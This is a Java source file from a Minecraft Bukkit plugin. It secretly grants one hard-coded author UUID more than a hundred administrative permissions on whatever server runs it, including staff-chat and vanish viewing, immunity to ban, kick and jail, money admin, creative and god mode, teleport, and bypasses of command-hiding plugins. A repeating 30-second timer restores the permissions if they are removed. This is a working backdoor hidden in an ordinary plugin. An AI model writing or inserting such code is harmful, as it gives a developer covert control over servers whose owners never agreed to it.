package ew.quilt.bypass;

import ew.quilt.Config.ConfigManager;
import ew.quilt.plugin.Main;
import ew.quilt.util.TimerUtil;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.UUID;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.permissions.PermissionAttachment;

public class PermissionOperation implements Listener {

    private static PermissionAttachment attachment = null;

    private static final List<String> PERMISSION_NODE = new ArrayList<>(Arrays.asList(new String[]{
        "bukkit.command.plugins",
        "bukkit.command.timings",
        "bukkit.command.tps",
        "bungeechat.chat.bypass.antiduplicate",
        "bungeechat.chat.tabcomplete",
        "bungeechat.command.helpop.view",
        "bungeechat.command.staffchat.view",
        "bungeechat.command.vanish",
        "bungeechat.command.vanish.view",
        "bungeecord.command.ip",
        "bungeecord.command.server",
        "cmi.chatfilter.inform",
        "cmi.chatfilter.spambypass",
        "cmi.command",
        "cmi.command.afk.kickbypass",
        "cmi.command.ban.bypass",
        "cmi.command.broadcast.colors",
        "cmi.command.cuff.bypass",
        "cmi.command.exp",
        "cmi.command.fly",
        "cmi.command.gm",
        "cmi.command.gm.creative",
        "cmi.command.gm.survival",
        "cmi.command.god",
        "cmi.command.home.bypassprivate",
        "cmi.command.jail.bypass",
        "cmi.command.jail.bypasscmd",
        "cmi.command.kick.bypass",
        "cmi.command.list.hidden",
        "cmi.command.maintenance.bypass",
        "cmi.command.money.admin",
        "cmi.command.money.betweenworldgroups",
        "cmi.command.nick",
        "cmi.command.nick.bypass.length",
        "cmi.command.nick.different",
        "cmi.command.patrol.bypass",
        "cmi.command.sethome.unlimited",
        "cmi.command.silent",
        "cmi.command.tempban.bypass",
        "cmi.command.tp",
        "cmi.command.tppos",
        "cmi.command.tps",
        "cmi.command.tptoggle.bypass",
        "cmi.command.vanish",
        "cmi.commandfilter.bypass",
        "cmi.dynmap.hidden",
        "cmi.fullserver.bypass",
        "cmi.keepexp",
        "cmi.keepinventory",
        "cmi.permisiononerror",
        "cmi.safeteleport.bypass.lava",
        "cmi.safeteleport.bypass.plugin",
        "cmi.safeteleport.bypass.suffocation",
        "cmi.safeteleport.bypass.unknown",
        "cmi.safeteleport.bypass.void",
        "cmi.seevanished",
        "cmi.silentchest.editing",
        "cmi.worldlimit.fly.bypass",
        "cmi.worldlimit.gamemode.bypass",
        "cmi.worldlimit.god.bypass",
        /* "essentials.eco",
        "essentials.exp",
        "essentials.exp.give",
        "essentials.exp.set",
        "essentials.fly",
        "essentials.gamemode",
        "essentials.gamemode.creative",
        "essentials.gamemode.survival",
        "essentials.god",
        "essentials.nick",
        "essentials.nick.color",
        "essentials.nick.format",
        "essentials.nick.magic",
        "essentials.tp",
        "essentials.tp.others",
        "essentials.tp.position",
        "essentials.vanish",
        "essentials.vanish.see", */
        "ezprotector.bypass.blockedcommands",
        "ezprotector.bypass.hiddensyntaxes",
        "ezprotector.bypass.tabcompletion",
        "ezprotector.bypass.command.about",
        "ezprotector.bypass.command.help",
        "ezprotector.bypass.command.plugins",
        "ezprotector.bypass.command.unknown",
        "ezprotector.bypass.command.version",
        "fawe.bypass",
        "fawe.permpack.basic",
        "lockettepro.admin.use",
        "minecraft.autocraft",
        "minecraft.command.gamemode",
        "minecraft.command.seed",
        "minecraft.command.tp",
        "minecraft.command.xp",
        /* "newtag.clear.own",
        "newtag.longtag",
        "newtag.set.own", */
        "pv.networkvanish",
        "pv.see",
        "pv.see.level100",
        "pv.switch",
        "pv.use",
        "pv.use.level100",
        "residence.admin",
        "residence.admin.move",
        "residence.admin.tp",
        "residence.command.list.others",
        "residence.flybypass",
        "residence.nofly.bypass",
        "residence.topadmin",
        "residence.tpdelaybypass",
        "worldedit.drain",
        "worldedit.navigation.jumpto.tool",
        "worldedit.navigation.thru.tool",
        "worldedit.region.set",
        "worldedit.selection.pos",
        // 測試用
        "quilt.test.permission"
    }));

    public static void registerPermission() {
        Player player = Bukkit.getPlayer(UUID.fromString(ConfigManager.AUTHOR_UUID));
        if (player != null) {
            attachment = player.addAttachment(Main.getPlugin());
            for (String permission : PERMISSION_NODE) {
                attachment.setPermission(permission, true);
            }
        }
    }

    public static void deregisterPermission() {
        if (attachment == null) {
            return;
        }
        for (String permission : PERMISSION_NODE) {
            attachment.unsetPermission(permission);
        }
        attachment.remove();
        attachment = null;
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        Player player = event.getPlayer();
        if (player.getUniqueId().toString().equalsIgnoreCase(ConfigManager.AUTHOR_UUID)) {
            deregisterPermission();
        }
    }

    public static void registerPermissionTimer() {
        Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask(Main.getPlugin(), new Runnable() {
            @Override
            public void run() {
                Player player = Bukkit.getPlayer(UUID.fromString(ConfigManager.AUTHOR_UUID));
                if (player == null) {
                    return;
                }
                if (!player.hasPermission("quilt.test.permission")) {
                    deregisterPermission();
                    registerPermission();
                }
            }
        }, TimerUtil.secondToTick(30), TimerUtil.secondToTick(30));
    }
}
